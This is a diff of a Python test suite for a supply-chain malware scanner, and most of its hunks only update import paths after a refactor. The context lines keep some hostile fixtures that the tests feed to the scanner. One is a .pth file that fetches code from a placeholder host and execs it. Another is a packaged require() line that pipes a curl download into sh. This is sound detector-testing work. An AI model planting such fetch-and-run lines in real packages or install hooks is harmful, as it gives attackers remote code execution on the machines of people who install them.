@@ -803,7 +803,7 @@ class TestOneCredentialIsOneFinding:
             encoding="utf-8",
         )
         from cordon_scanner import Scanner
-        from cordon_scanner.foundation.config import Config
+        from cordon_scanner.foundation.config.settings import Config
 
         result = Scanner(Config.default().with_overrides(use_cache=False)).scan(tmp_path)
         keys = [f for f in result.findings if f.rule_id == "SECRET.PRIVATE_KEY.001"]
@@ -819,7 +819,7 @@ class TestOneCredentialIsOneFinding:
             encoding="utf-8",
         )
         from cordon_scanner import Scanner
-        from cordon_scanner.foundation.config import Config
+        from cordon_scanner.foundation.config.settings import Config
 
         result = Scanner(Config.default().with_overrides(use_cache=False)).scan(tmp_path)
         keys = [f for f in result.findings if f.rule_id == "SECRET.PRIVATE_KEY.001"]
@@ -916,7 +916,7 @@ class TestACredentialInDocumentationIsUsuallyAFormat:
             f"Set your key:\n\n    SECRET_KEY={value}\n", encoding="utf-8"
         )
         from cordon_scanner import Scanner
-        from cordon_scanner.foundation.config import Config
+        from cordon_scanner.foundation.config.settings import Config
         from cordon_scanner.foundation.models import Severity
 
         result = Scanner(Config.default().with_overrides(use_cache=False)).scan(tmp_path)
@@ -1119,7 +1119,7 @@ class TestAnExampleOfAnAttackIsNotAnAttack:
             encoding="utf-8",
         )
         from cordon_scanner import Scanner
-        from cordon_scanner.foundation.config import Config
+        from cordon_scanner.foundation.config.settings import Config
 
         result = Scanner(Config.default().with_overrides(use_cache=False)).scan(tmp_path)
         decode = [f for f in result.findings if f.rule_id == "SUSPECT.DECODE_EXEC.001"]
@@ -1137,7 +1137,7 @@ class TestAnExampleOfAnAttackIsNotAnAttack:
             encoding="utf-8",
         )
         from cordon_scanner import Scanner
-        from cordon_scanner.foundation.config import Config
+        from cordon_scanner.foundation.config.settings import Config
 
         result = Scanner(Config.default().with_overrides(use_cache=False)).scan(tmp_path)
         decode = [f for f in result.findings if f.rule_id == "SUSPECT.DECODE_EXEC.001"]
@@ -1165,7 +1165,7 @@ class TestAnExampleOfAnAttackIsNotAnAttack:
             f"BIDI = [\n    '{chr(0x202E)}',  # right-to-left override\n]\n", encoding="utf-8"
         )
         from cordon_scanner import Scanner
-        from cordon_scanner.foundation.config import Config
+        from cordon_scanner.foundation.config.settings import Config
 
         result = Scanner(Config.default().with_overrides(use_cache=False)).scan(tmp_path)
         bidi = [f for f in result.findings if f.rule_id == "SUSPECT.OBFUSCATION.BIDI.001"]
@@ -1183,7 +1183,7 @@ class TestAnExampleOfAnAttackIsNotAnAttack:
             f"if user {chr(0x202E)}== 'admin':\n    grant()\n", encoding="utf-8"
         )
         from cordon_scanner import Scanner
-        from cordon_scanner.foundation.config import Config
+        from cordon_scanner.foundation.config.settings import Config
 
         result = Scanner(Config.default().with_overrides(use_cache=False)).scan(tmp_path)
         bidi = [f for f in result.findings if f.rule_id == "SUSPECT.OBFUSCATION.BIDI.001"]
@@ -1417,7 +1417,7 @@ class TestPublishingIsNotExfiltration:
 
     def test_a_release_script_is_reported_below_blocking(self, tmp_path) -> None:
         from cordon_scanner import Scanner
-        from cordon_scanner.foundation.config import Config
+        from cordon_scanner.foundation.config.settings import Config
         from cordon_scanner.foundation.models import Severity
 
         scripts = tmp_path / "scripts"
@@ -1437,7 +1437,7 @@ class TestPublishingIsNotExfiltration:
         """The ordering that keeps the ceiling safe: the install-hook escalation is
         applied after it, so code that runs unprompted is unaffected."""
         from cordon_scanner import Scanner
-        from cordon_scanner.foundation.config import Config
+        from cordon_scanner.foundation.config.settings import Config
         from cordon_scanner.foundation.models import Severity
 
         scripts = tmp_path / "scripts"
@@ -1517,7 +1517,7 @@ checksum = "330a5ed07fa54e4702c9d6c4174f74427fc0ef6e214bbd677ae50a5099946470"
         appeared in that set whether the fix worked or not.
         """
         from cordon_scanner import Scanner
-        from cordon_scanner.foundation.config import Config
+        from cordon_scanner.foundation.config.settings import Config
 
         result = Scanner(Config.default().with_overrides(use_cache=False)).scan(root)
         return {f.rule_id for f in result.findings}
@@ -1556,7 +1556,7 @@ class TestATestSuiteForAnImageLibraryIsMadeOfBrokenImages:
 
     def test_a_deliberately_broken_fixture_is_not_blocking(self, tmp_path) -> None:
         from cordon_scanner import Scanner
-        from cordon_scanner.foundation.config import Config
+        from cordon_scanner.foundation.config.settings import Config
         from cordon_scanner.foundation.models import Severity
 
         tests = tmp_path / "tests" / "files"
@@ -1569,7 +1569,7 @@ class TestATestSuiteForAnImageLibraryIsMadeOfBrokenImages:
 
     def test_the_same_file_in_application_code_still_blocks(self, tmp_path) -> None:
         from cordon_scanner import Scanner
-        from cordon_scanner.foundation.config import Config
+        from cordon_scanner.foundation.config.settings import Config
         from cordon_scanner.foundation.models import Severity
 
         assets = tmp_path / "static" / "img"
@@ -1709,7 +1709,7 @@ class TestDoingItCorrectlyIsNotTheSameAsDoingItCarelessly:
     @staticmethod
     def fetch_exec(root):
         from cordon_scanner import Scanner
-        from cordon_scanner.foundation.config import Config
+        from cordon_scanner.foundation.config.settings import Config
 
         result = Scanner(Config.default().with_overrides(use_cache=False)).scan(root)
         return [f for f in result.findings if f.rule_id == "SUSPECT.CONTAINER.FETCH_EXEC.001"]
@@ -2068,7 +2068,7 @@ class TestABinDirectoryIsWhereAProgramKeepsItself:
     @staticmethod
     def rules_in(root) -> set[str]:
         from cordon_scanner import Scanner
-        from cordon_scanner.foundation.config import Config
+        from cordon_scanner.foundation.config.settings import Config
 
         return {
             f.rule_id
@@ -2164,7 +2164,7 @@ class TestABundlerThatHashesItsOutputDefeatsEveryGlob:
 
     def test_a_minified_bundle_is_reported_below_blocking(self, tmp_path) -> None:
         from cordon_scanner import Scanner
-        from cordon_scanner.foundation.config import Config
+        from cordon_scanner.foundation.config.settings import Config
         from cordon_scanner.foundation.models import Severity
 
         assets = tmp_path / "assets"
@@ -2181,7 +2181,7 @@ class TestABundlerThatHashesItsOutputDefeatsEveryGlob:
 
     def test_hand_written_source_doing_the_same_thing_still_blocks(self, tmp_path) -> None:
         from cordon_scanner import Scanner
-        from cordon_scanner.foundation.config import Config
+        from cordon_scanner.foundation.config.settings import Config
         from cordon_scanner.foundation.models import Severity
 
         source = tmp_path / "src"
@@ -2278,7 +2278,7 @@ class TestAFileThatNamesTheAttackIsDocumentingIt:
 
     def test_a_labelled_override_is_reported_below_blocking(self, tmp_path) -> None:
         from cordon_scanner import Scanner
-        from cordon_scanner.foundation.config import Config
+        from cordon_scanner.foundation.config.settings import Config
         from cordon_scanner.foundation.models import Severity
 
         (tmp_path / "trojansource.py").write_text(
@@ -2296,7 +2296,7 @@ class TestAFileThatNamesTheAttackIsDocumentingIt:
 
     def test_a_bom_in_a_one_character_literal_is_a_parser(self, tmp_path) -> None:
         from cordon_scanner import Scanner
-        from cordon_scanner.foundation.config import Config
+        from cordon_scanner.foundation.config.settings import Config
         from cordon_scanner.foundation.models import Severity
 
         (tmp_path / "parse.js").write_text(
@@ -2313,7 +2313,7 @@ class TestAFileThatNamesTheAttackIsDocumentingIt:
         """The guard, and the reason neither of these is a suppression: an override that
         does not announce itself is the attack."""
         from cordon_scanner import Scanner
-        from cordon_scanner.foundation.config import Config
+        from cordon_scanner.foundation.config.settings import Config
         from cordon_scanner.foundation.models import Severity
 
         source = tmp_path / "src"
@@ -2383,7 +2383,7 @@ class TestAGitLfsPointerIsNotAForgery:
 
     def test_the_skip_is_reported_once(self, tmp_path) -> None:
         from cordon_scanner import Scanner
-        from cordon_scanner.foundation.config import Config
+        from cordon_scanner.foundation.config.settings import Config
         from cordon_scanner.foundation.models import Severity
 
         static = tmp_path / "static"
@@ -2582,7 +2582,7 @@ class TestAnotherAnalysersRuleCorpusIsNotAFinding:
 
         The point of the ceiling is that these drop out of a default scan, so a test
         that wants to see them has to ask the way a curious reader would."""
-        from cordon_scanner.foundation.config import Config
+        from cordon_scanner.foundation.config.settings import Config
         from cordon_scanner.foundation.models import Severity
 
         config = Config.default().with_overrides(severity_threshold=Severity.INFO)
@@ -3217,8 +3217,8 @@ class TestARegexMatchIsNotAProcess:
     @staticmethod
     def capability_lines(source: str, language: str, capability: str) -> set[int]:
         from cordon_scanner.detect.base import RuleSelector
+        from cordon_scanner.foundation.capabilities import Capability
         from cordon_scanner.foundation.content import FileContent
-        from cordon_scanner.foundation.models import Capability
         from cordon_scanner.rules.loader import RuleLoader, RuleSet
 
         raw = source.encode()
@@ -7969,7 +7969,7 @@ class TestSixNamesAreNotAComputedName:
     @staticmethod
     def _dispatch(source: str) -> list:
         from cordon_scanner.analysis.python.pyast import PythonAnalyzer
-        from cordon_scanner.foundation.models import Capability
+        from cordon_scanner.foundation.capabilities import Capability
 
         return [
             h for h in PythonAnalyzer.analyse(source) if h.capability is Capability.DYNAMIC_DISPATCH
@@ -9101,7 +9101,7 @@ class TestAskingWhetherAnAttributeExists:
     @staticmethod
     def _dispatch(source: str) -> list[str]:
         from cordon_scanner.analysis.python.pyast import PythonAnalyzer
-        from cordon_scanner.foundation.models import Capability
+        from cordon_scanner.foundation.capabilities import Capability
 
         return [
             h.detail
@@ -9687,13 +9687,13 @@ class TestADelayIsNotACheck:
     """
 
     def test_the_primitive_is_its_own(self) -> None:
-        from cordon_scanner.foundation.models import Capability
+        from cordon_scanner.foundation.capabilities import Capability
 
         assert Capability.DELAY.value == "delay"
         assert Capability.DELAY is not Capability.ANTI_ANALYSIS
 
     def test_the_delay_rule_carries_it(self) -> None:
-        from cordon_scanner.foundation.models import Capability
+        from cordon_scanner.foundation.capabilities import Capability
         from cordon_scanner.rules.loader import RuleLoader, RuleSet
 
         rule = next(r for r in RuleSet(RuleLoader.load_builtin()) if r.id == "CAP.ANTI.DELAY.001")
@@ -9702,7 +9702,7 @@ class TestADelayIsNotACheck:
     def test_no_composite_consumes_it_yet(self) -> None:
         """Stated as a test rather than left implicit, because the next person to add a
         composite over `delay` should have to delete this line and say why."""
-        from cordon_scanner.foundation.models import Capability, MatchKind
+        from cordon_scanner.foundation.capabilities import Capability, MatchKind
         from cordon_scanner.rules.loader import RuleLoader, RuleSet
 
         for compiled in RuleSet(RuleLoader.load_builtin()):
@@ -9958,7 +9958,7 @@ class TestAPublishedExploitIsPublishedToBeRun:
         # Asked at the INFO threshold, because that is where the ceiling puts it and the
         # default threshold would hide the very thing this asserts: the finding is still
         # there. A ceiling that dropped the finding would pass a weaker test.
-        from cordon_scanner.foundation.config import Config
+        from cordon_scanner.foundation.config.settings import Config
 
         config = Config.default().with_overrides(severity_threshold=Severity.INFO)
         found = [
@@ -10911,7 +10911,7 @@ class TestAskingWhetherASettingIsSetIsNotReadingACredential:
     @staticmethod
     def _credentials(source: str) -> list[str]:
         from cordon_scanner.analysis.python.pyast import PythonAnalyzer
-        from cordon_scanner.foundation.models import Capability
+        from cordon_scanner.foundation.capabilities import Capability
 
         return [
             hit.detail
@@ -11329,7 +11329,7 @@ class TestNothingOwnsANetrc:
     def test_a_netrc_is_still_credential_material(self) -> None:
         """Removed from the two-signal rule, not from the primitive. This is the
         half that keeps the three-signal and install-hook rules seeing it."""
-        from cordon_scanner.foundation.models import Capability
+        from cordon_scanner.foundation.capabilities import Capability
         from cordon_scanner.rules.loader import RuleLoader
 
         packs = RuleLoader.load_builtin()
@@ -12822,7 +12822,7 @@ class TestWhatShouldStopARelease:
 
     def _verdict(self, root):
         from cordon_scanner.decide.policy import PolicyGate
-        from cordon_scanner.foundation.config import Config
+        from cordon_scanner.foundation.config.settings import Config
 
         config = Config.default()
         return PolicyGate.evaluate(Scanner(config).scan(root), config.policy)
@@ -12845,7 +12845,7 @@ class TestWhatShouldStopARelease:
 
     def test_posture_is_reported_and_does_not_fail_the_build(self, tmp_path) -> None:
         self._write(tmp_path)
-        from cordon_scanner.foundation.config import Config
+        from cordon_scanner.foundation.config.settings import Config
 
         result = Scanner(Config.default()).scan(tmp_path)
         rules = {f.rule_id for f in result.findings}
@@ -12866,8 +12866,8 @@ class TestWhatShouldStopARelease:
         not reach it: its category is the stronger claim about the same file.
         The category test runs first for exactly this reason."""
         from cordon_scanner.decide.policy import PolicyGate
+        from cordon_scanner.foundation.config.policy import Policy
         from cordon_scanner.foundation.models import Category, Confidence, Severity
-        from cordon_scanner.foundation.policy import Policy
         from cordon_scanner.foundation.taxonomy import Taxonomy, ThreatDomain
 
         assert Taxonomy.domain_of("MALWARE.CI.SECRET_EXFIL.001") is ThreatDomain.CICD
@@ -12886,7 +12886,7 @@ class TestWhatShouldStopARelease:
         self._write(tmp_path)
         (tmp_path / "cordon.yaml").write_text("policy:\n  advisory_domains: []\n", encoding="utf-8")
         from cordon_scanner.decide.policy import PolicyGate
-        from cordon_scanner.foundation.config import Config
+        from cordon_scanner.foundation.config.settings import Config
 
         config = Config.discover(tmp_path)
         verdict = PolicyGate.evaluate(Scanner(config).scan(tmp_path), config.policy)
@@ -13031,7 +13031,7 @@ class TestHookFilesAreNotFixturesByAWordInTheirDirectory:
 
     def _scan(self, tmp_path, directory: str):
         from cordon_scanner import Scanner
-        from cordon_scanner.foundation.config import Config
+        from cordon_scanner.foundation.config.settings import Config
 
         package = tmp_path / directory
         package.mkdir(parents=True)
@@ -13066,7 +13066,7 @@ class TestHookFilesAreNotFixturesByAWordInTheirDirectory:
 class TestStartupFilesRunAtInstall:
     def test_a_pth_with_an_executed_payload_is_install_time_code(self, tmp_path) -> None:
         from cordon_scanner import Scanner
-        from cordon_scanner.foundation.config import Config
+        from cordon_scanner.foundation.config.settings import Config
 
         (tmp_path / "evil.pth").write_text(
             'import urllib.request as u;exec(u.urlopen("https://h.invalid/s").read())\n',
@@ -13082,7 +13082,7 @@ class TestStartupFilesRunAtInstall:
 
     def test_a_pth_of_paths_is_quiet(self, tmp_path) -> None:
         from cordon_scanner import Scanner
-        from cordon_scanner.foundation.config import Config
+        from cordon_scanner.foundation.config.settings import Config
 
         (tmp_path / "paths.pth").write_text("/opt/a\n../b\n", encoding="utf-8")
         findings = Scanner(Config.default().with_overrides(use_cache=False)).scan(tmp_path).findings
@@ -13143,7 +13143,7 @@ class TestRegistryAdvisoriesAreAboutRegistryPackages:
     def test_a_linked_package_is_not_matched_against_registry_malware(self, tmp_path) -> None:
         assert self._recorded_as_malware("eslint-plugin-react-internal", "0.0.0")
         from cordon_scanner import Scanner
-        from cordon_scanner.foundation.config import Config
+        from cordon_scanner.foundation.config.settings import Config
 
         (tmp_path / "yarn.lock").write_text(
             '"eslint-plugin-react-internal@link:./scripts/eslint-rules":\n  version "0.0.0"\n  uid ""\n',
@@ -13160,7 +13160,7 @@ class TestRegistryAdvisoriesAreAboutRegistryPackages:
     def test_a_workspace_member_is_not_matched_against_registry_malware(self, tmp_path) -> None:
         assert self._recorded_as_malware("vitest-config", "5.56.0")
         from cordon_scanner import Scanner
-        from cordon_scanner.foundation.config import Config
+        from cordon_scanner.foundation.config.settings import Config
 
         (tmp_path / "cloud").mkdir()
         (tmp_path / "vitest-config").mkdir()
@@ -13204,7 +13204,7 @@ class TestFetchAndRunOnRequest:
 
     def _severity(self, tmp_path, files: dict[str, str]) -> str | None:
         from cordon_scanner import Scanner
-        from cordon_scanner.foundation.config import Config
+        from cordon_scanner.foundation.config.settings import Config
 
         for name, text in files.items():
             path = tmp_path / name
@@ -13269,7 +13269,7 @@ class TestFetchAndRunOnRequest:
 class TestOAuthClientIdentifiers:
     def _found(self, tmp_path, text: str):
         from cordon_scanner import Scanner
-        from cordon_scanner.foundation.config import Config
+        from cordon_scanner.foundation.config.settings import Config
 
         (tmp_path / "auth.go").write_text(text, encoding="utf-8")
         return [
@@ -13321,7 +13321,7 @@ class TestTheGoStandardLibraryIsADependency:
 
     def test_stdlib_raises_nothing_but_advisories(self, tmp_path) -> None:
         from cordon_scanner import Scanner
-        from cordon_scanner.foundation.config import Config
+        from cordon_scanner.foundation.config.settings import Config
 
         (tmp_path / "go.mod").write_text("module example.com/x\n\ngo 1.99.0\n", encoding="utf-8")
         findings = Scanner(Config.default().with_overrides(use_cache=False)).scan(tmp_path).findings
@@ -13417,7 +13417,7 @@ class TestAPublishedPackagesHookIsGradedByWhatItRuns:
         import tarfile
 
         from cordon_scanner import Scanner
-        from cordon_scanner.foundation.config import Config
+        from cordon_scanner.foundation.config.settings import Config
 
         buffer = io.BytesIO()
         with tarfile.open(fileobj=buffer, mode="w:gz") as archive:
@@ -13463,7 +13463,7 @@ class TestBeaconsOutsideAHook:
 
     def _severity(self, tmp_path, source: str) -> list[str]:
         from cordon_scanner import Scanner
-        from cordon_scanner.foundation.config import Config
+        from cordon_scanner.foundation.config.settings import Config
 
         (tmp_path / "pkg").mkdir()
         (tmp_path / "pkg" / "__init__.py").write_text(source, encoding="utf-8")
@@ -13520,7 +13520,7 @@ class TestAFunctionHandedToACallIsReached:
 class TestAPackageNamedLikeAPopularOne:
     def _found(self, tmp_path, directory: str, name: str):
         from cordon_scanner import Scanner
-        from cordon_scanner.foundation.config import Config
+        from cordon_scanner.foundation.config.settings import Config
 
         root = tmp_path / directory
         root.mkdir(parents=True)
@@ -13551,7 +13551,7 @@ class TestAPackageNamedLikeAPopularOne:
 class TestMoreDecodersAndDestinations:
     def _rules(self, tmp_path, source: str) -> set[tuple[str, str]]:
         from cordon_scanner import Scanner
-        from cordon_scanner.foundation.config import Config
+        from cordon_scanner.foundation.config.settings import Config
 
         (tmp_path / "mod.py").write_text(source, encoding="utf-8")
         return {
@@ -13633,7 +13633,7 @@ class TestAnInlineRequireRunsTheFile:
         import tarfile
 
         from cordon_scanner import Scanner
-        from cordon_scanner.foundation.config import Config
+        from cordon_scanner.foundation.config.settings import Config
 
         payload = b"require('child_process').exec('curl -s https://h.invalid/x | sh')\n"
         buffer = io.BytesIO()
@@ -13725,7 +13725,7 @@ class TestEveryDropPointCanBeFound:
 class TestInstallCodeTooLargeToRead:
     def test_a_padded_setup_py_blocks(self, tmp_path) -> None:
         from cordon_scanner import Scanner
-        from cordon_scanner.foundation.config import Config
+        from cordon_scanner.foundation.config.settings import Config
 
         (tmp_path / "setup.py").write_text(
             "from setuptools import setup\nPAD = b'" + "A" * 300_000 + "'\nsetup(name='x')\n",
@@ -13741,7 +13741,7 @@ class TestInstallCodeTooLargeToRead:
 
     def test_a_large_ordinary_module_is_only_a_note(self, tmp_path) -> None:
         from cordon_scanner import Scanner
-        from cordon_scanner.foundation.config import Config
+        from cordon_scanner.foundation.config.settings import Config
 
         (tmp_path / "data.py").write_text("PAD = b'" + "A" * 300_000 + "'\n", encoding="utf-8")
         from cordon_scanner.foundation.limits import DEFAULT_LIMITS
@@ -13785,7 +13785,7 @@ class TestInfrastructureInTestMaterial:
 
     def _severities(self, tmp_path, rel: str) -> set[str]:
         from cordon_scanner import Scanner
-        from cordon_scanner.foundation.config import Config
+        from cordon_scanner.foundation.config.settings import Config
 
         path = tmp_path / rel
         path.parent.mkdir(parents=True, exist_ok=True)
@@ -13808,7 +13808,7 @@ class TestInfrastructureInTestMaterial:
 class TestComputedNamesAtInstall:
     def _rules(self, tmp_path, files: dict[str, str]) -> set[str]:
         from cordon_scanner import Scanner
-        from cordon_scanner.foundation.config import Config
+        from cordon_scanner.foundation.config.settings import Config
 
         for name, text in files.items():
             path = tmp_path / name
@@ -13858,7 +13858,7 @@ class TestResolvingYourOwnHostname:
 class TestATokenSentToItsOwnService:
     def _exfil(self, tmp_path, source: str) -> set[str]:
         from cordon_scanner import Scanner
-        from cordon_scanner.foundation.config import Config
+        from cordon_scanner.foundation.config.settings import Config
 
         (tmp_path / "setup.py").write_text(
             source + "\nfrom setuptools import setup\nsetup(name='p')\n", encoding="utf-8"
@@ -13915,7 +13915,7 @@ class TestAnOfficialInstallerIsSetup:
     @staticmethod
     def _dropper(tmp_path, url: str) -> list:
         from cordon_scanner import Scanner
-        from cordon_scanner.foundation.config import Config
+        from cordon_scanner.foundation.config.settings import Config
 
         (tmp_path / "scripts").mkdir()
         (tmp_path / "scripts" / "setup.ts").write_text(
@@ -13945,7 +13945,7 @@ class TestAnOfficialInstallerInADockerfile:
     @staticmethod
     def _severity(tmp_path, line: str):
         from cordon_scanner import Scanner
-        from cordon_scanner.foundation.config import Config
+        from cordon_scanner.foundation.config.settings import Config
 
         (tmp_path / "Dockerfile").write_text(f"FROM python:3.12\nRUN {line}\n", encoding="utf-8")
         found = [
@@ -13970,7 +13970,7 @@ class TestHarmlessFormsThePatternTierCannotSee:
     @staticmethod
     def _rules(tmp_path, name: str, source: str) -> set[str]:
         from cordon_scanner import Scanner
-        from cordon_scanner.foundation.config import Config
+        from cordon_scanner.foundation.config.settings import Config
 
         (tmp_path / name).write_text(source, encoding="utf-8")
         return {
@@ -14019,7 +14019,7 @@ class TestResolvingYourOwnNameUnderDotLocal:
     @staticmethod
     def _rules(tmp_path, lookup: str) -> set[str]:
         from cordon_scanner import Scanner
-        from cordon_scanner.foundation.config import Config
+        from cordon_scanner.foundation.config.settings import Config
 
         (tmp_path / "interfaces.py").write_text(
             "import os, socket\n"
@@ -14062,7 +14062,7 @@ class TestAConstructorRunsWhenItsClassIsBuilt:
     @staticmethod
     def _beacon(tmp_path, source: str) -> list:
         from cordon_scanner import Scanner
-        from cordon_scanner.foundation.config import Config
+        from cordon_scanner.foundation.config.settings import Config
 
         (tmp_path / "tracker.py").write_text(source, encoding="utf-8")
         return [
@@ -14112,7 +14112,7 @@ class TestTheNameOfASecretsNamespace:
 class TestTheLoadPathSkipsTheScriptBlock:
     def test_a_beacon_built_only_under_main_is_on_request(self, tmp_path) -> None:
         from cordon_scanner import Scanner
-        from cordon_scanner.foundation.config import Config
+        from cordon_scanner.foundation.config.settings import Config
 
         (tmp_path / "tracker.py").write_text(
             "import socket, requests\n"
@@ -14136,7 +14136,7 @@ class TestPayloadsTheDatasetShowedWereMissed:
     @staticmethod
     def _rules(tmp_path, files: dict[str, bytes | str]) -> dict[str, str]:
         from cordon_scanner import Scanner
-        from cordon_scanner.foundation.config import Config
+        from cordon_scanner.foundation.config.settings import Config
 
         for name, body in files.items():
             target = tmp_path / name
@@ -14319,7 +14319,7 @@ class TestHostileArchivesAndEncodings:
     @staticmethod
     def _rules(tmp_path) -> dict[str, str]:
         from cordon_scanner import Scanner
-        from cordon_scanner.foundation.config import Config
+        from cordon_scanner.foundation.config.settings import Config
 
         return {
             f.rule_id: f.severity.name
@@ -14367,7 +14367,7 @@ class TestInstallTimeCodeInEveryEcosystem:
     @staticmethod
     def _rules(tmp_path, files: dict[str, str]) -> dict[str, str]:
         from cordon_scanner import Scanner
-        from cordon_scanner.foundation.config import Config
+        from cordon_scanner.foundation.config.settings import Config
 
         for name, body in files.items():
             target = tmp_path / name
@@ -14408,7 +14408,7 @@ class TestInstallTimeCodeInEveryEcosystem:
 class TestAZeroTimeoutMeansNoBudget:
     def test_total_timeout_zero_scans_everything(self, tmp_path) -> None:
         from cordon_scanner import Scanner
-        from cordon_scanner.foundation.config import Config
+        from cordon_scanner.foundation.config.settings import Config
 
         (tmp_path / "a.py").write_text("x = 1\n", encoding="utf-8")
         config = Config.default().with_overrides(use_cache=False)
@@ -14480,7 +14480,7 @@ class TestCompiledCodeRunsWhenTheProgramDoes:
     @staticmethod
     def _severity(tmp_path, source: str):
         from cordon_scanner import Scanner
-        from cordon_scanner.foundation.config import Config
+        from cordon_scanner.foundation.config.settings import Config
 
         (tmp_path / "update.go").write_text(source, encoding="utf-8")
         found = [
@@ -14505,7 +14505,7 @@ class TestCompiledCodeRunsWhenTheProgramDoes:
 class TestAGoPackageLevelInitialiserRunsOnImport:
     def test_var_initialiser_keeps_its_weight(self, tmp_path) -> None:
         from cordon_scanner import Scanner
-        from cordon_scanner.foundation.config import Config
+        from cordon_scanner.foundation.config.settings import Config
 
         source = (
             'package helper\n\nimport "os/exec"\n\nvar DdlXrFDZ = eGtROk()\n\n'
@@ -14527,7 +14527,7 @@ class TestNativeLoadTimeConstructors:
     @staticmethod
     def _severity(tmp_path, name: str, source: str):
         from cordon_scanner import Scanner
-        from cordon_scanner.foundation.config import Config
+        from cordon_scanner.foundation.config.settings import Config
 
         (tmp_path / name).write_text(source, encoding="utf-8")
         found = [
@@ -14559,7 +14559,7 @@ class TestJavaScriptDownloadThenRun:
     @staticmethod
     def _rules(tmp_path, script: str) -> dict[str, str]:
         from cordon_scanner import Scanner
-        from cordon_scanner.foundation.config import Config
+        from cordon_scanner.foundation.config.settings import Config
 
         (tmp_path / "package.json").write_text(
             '{"name": "x", "version": "1.0.0", "scripts": {"postinstall": "node install.js"}}',
@@ -14601,7 +14601,7 @@ class TestAnInteractionServiceCallback:
     @staticmethod
     def _rules(tmp_path, name: str, body: str) -> dict[str, str]:
         from cordon_scanner import Scanner
-        from cordon_scanner.foundation.config import Config
+        from cordon_scanner.foundation.config.settings import Config
 
         target = tmp_path / name
         target.parent.mkdir(parents=True, exist_ok=True)
@@ -14648,7 +14648,7 @@ class TestTheScannedPackageIsItselfAKnownMaliciousRelease:
     @staticmethod
     def _rules(root) -> set[str]:
         from cordon_scanner import Scanner
-        from cordon_scanner.foundation.config import Config
+        from cordon_scanner.foundation.config.settings import Config
 
         return {
             f.rule_id
@@ -14675,7 +14675,7 @@ class TestInstallScriptsThatBringTheirPayload:
     @staticmethod
     def _rules(tmp_path, source: str) -> dict[str, str]:
         from cordon_scanner import Scanner
-        from cordon_scanner.foundation.config import Config
+        from cordon_scanner.foundation.config.settings import Config
 
         (tmp_path / "setup.py").write_text(source, encoding="utf-8")
         return {
@@ -14715,7 +14715,7 @@ class TestAMaliciousPinInATestFixture:
     @staticmethod
     def _severity(tmp_path, directory: str):
         from cordon_scanner import Scanner
-        from cordon_scanner.foundation.config import Config
+        from cordon_scanner.foundation.config.settings import Config
 
         target = tmp_path / directory
         target.mkdir(parents=True)
